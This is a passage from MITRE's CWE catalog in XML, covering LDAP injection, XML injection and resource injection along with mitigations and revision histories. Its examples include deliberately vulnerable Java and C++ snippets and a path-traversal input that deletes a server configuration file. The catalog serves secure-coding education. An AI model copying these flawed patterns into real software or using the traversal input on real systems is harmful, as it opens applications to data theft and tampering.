               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Modes_of_Introduction, Name, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Name, Observed_Examples, Other_Notes, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Name, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>KDM Analytics</Modification_Name>
               <Modification_Date>2009-07-17</Modification_Date>
               <Modification_Comment>Improved the White_Box_Definition</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Description, Name, White_Box_Definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Name, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Enabling_Factors_for_Exploitation, Likelihood_of_Exploit, Modes_of_Introduction, Observed_Examples, References, Relationships, White_Box_Definitions</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2008-04-11">SQL Injection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2008-09-09">Failure to Sanitize Data into SQL Queries (aka 'SQL Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-01-12">Failure to Sanitize Data within SQL Queries (aka 'SQL Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Preserve SQL Query Structure (aka 'SQL Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-07-27">Failure to Preserve SQL Query Structure ('SQL Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Improper Sanitization of Special Elements used in an SQL Command ('SQL Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="90" Name="Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software constructs all or part of an LDAP query using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended LDAP query when it is sent to a downstream component.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="943" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="943" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="943" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Technology Name="Database Server" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Note>An attacker could include input that changes the LDAP query which allows unintended commands or code to be executed, allows sensitive data to be read or modified or causes other unintended behavior.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The code below constructs an LDAP query using user input address data:</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>context = new InitialDirContext(env);<xhtml:br/>String searchFilter = "StreetAddress=" + address;<xhtml:br/>NamingEnumeration answer = context.search(searchBase, searchFilter, searchCtls);</xhtml:div>
               </Example_Code>
               <Body_Text>Because the code fails to neutralize the address string used to construct the query, an attacker can supply an address that includes additional LDAP queries.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2005-2301</Reference>
               <Description>Server does not properly escape LDAP queries, which allows remote attackers to cause a DoS and possibly conduct an LDAP injection attack.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2301</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>LDAP injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>29</Entry_ID>
               <Entry_Name>LDAP Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="136"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-879"/>
         </References>
         <Notes>
            <Note Type="Relationship">Factors: resultant to special character mismanagement, MAID, or blacklist/whitelist problems. Can be primary to authentication and verification errors.</Note>
            <Note Type="Research Gap">Under-reported. This is likely found very frequently by third party code auditors, but there are very few publicly reported examples.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Other_Notes, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Name, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Observed_Examples, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2008-04-11">LDAP Injection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Sanitize Data into LDAP Queries (aka 'LDAP Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Failure to Sanitize Data into LDAP Queries ('LDAP Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="91" Name="XML Injection (aka Blind XPath Injection)" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software does not properly neutralize special elements that are used in XML, allowing attackers to modify the syntax, content, or commands of the XML before it is processed by an end system.</Description>
         <Extended_Description>Within XML, special elements could include reserved words or characters such as "&lt;", "&gt;", """, and "&amp;", which could then be used to add new data or modify XML syntax.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>XML injection (aka Blind Xpath injection)</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>23</Entry_ID>
               <Entry_Name>XML Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="250"/>
            <Related_Attack_Pattern CAPEC_ID="83"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-882"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 17, &#34;XML Injection&#34;, Page 1069."/>
         </References>
         <Notes>
            <Note Type="Maintenance">The description for this entry is generally applicable to XML, but the name includes "blind XPath injection" which is more closely associated with CWE-643. Therefore this entry might need to be deprecated or converted to a general category - although injection into raw XML is not covered by CWE-643 or CWE-652.</Note>
            <Note Type="Theoretical">In vulnerability theory terms, this is a representation-specific case of a Data/Directive Boundary Error.</Note>
            <Note Type="Research Gap">Under-reported. This is likely found regularly by third party code auditors, but there are very few publicly reported examples.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Other_Notes, Theoretical_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Description, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="99" Name="Improper Control of Resource Identifiers ('Resource Injection')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software receives input from an upstream component, but it does not restrict or incorrectly restricts the input before it is used as an identifier for a resource that may be outside the intended sphere of control.</Description>
         <Extended_Description>
            <xhtml:p>A resource injection issue occurs when the following two conditions are met:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ol>
                  <xhtml:li>An attacker can specify the identifier used to access a system resource. For example, an attacker might be able to specify part of the name of a file to be opened or a port number to be used.</xhtml:li>
                  <xhtml:li>By specifying the resource, the attacker gains a capability that would not otherwise be permitted. For example, the program may give the attacker the ability to overwrite the specified file, run with a configuration controlled by the attacker, or transmit sensitive information to a third-party server.</xhtml:li>
               </xhtml:ol>
            </xhtml:div>
            <xhtml:p>This may enable an attacker to access or modify otherwise protected system resources.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="706" View_ID="1000"/>
            <Related_Weakness Nature="CanAlsoBe" CWE_ID="73" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Insecure Direct Object Reference</Term>
               <Description>OWASP uses this term, although it is effectively the same as resource injection.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>Read Files or Directories</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Note>An attacker could gain access to or modify sensitive data or system resources. This could allow access to protected files or directories including configuration files and files containing sensitive information.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following Java code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as "../../tomcat/conf/server.xml", which causes the application to delete one of its own configuration files.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>String rName = request.getParameter("reportName");<xhtml:br/>File rFile = new File("/usr/local/apfr/reports/" + rName);<xhtml:br/>...<xhtml:br/>rFile.delete();</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code uses input from the command line to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can create soft links to the file, they can use the program to read the first part of any file on the system.</Intro_Text>
               <Example_Code Nature="bad" Language="C++">
                  <xhtml:div>ifstream ifs(argv[0]);<xhtml:br/>string s;<xhtml:br/>ifs &gt;&gt; s;<xhtml:br/>cout &lt;&lt; s;</xhtml:div>
               </Example_Code>
               <Body_Text>The kind of resource the data affects indicates the kind of content that may be dangerous. For example, data containing special characters like period, slash, and backslash, are risky when used in methods that interact with the file system. (Resource injection, when it is related to file system resources, sometimes goes by the name "path manipulation.") Similarly, data that contains URLs and URIs is risky for functions that create remote connections.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Resource Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="10"/>
            <Related_Attack_Pattern CAPEC_ID="240"/>
            <Related_Attack_Pattern CAPEC_ID="75"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Relationship">Resource injection that involves resources stored on the filesystem goes by the name path manipulation (CWE-73).</Note>
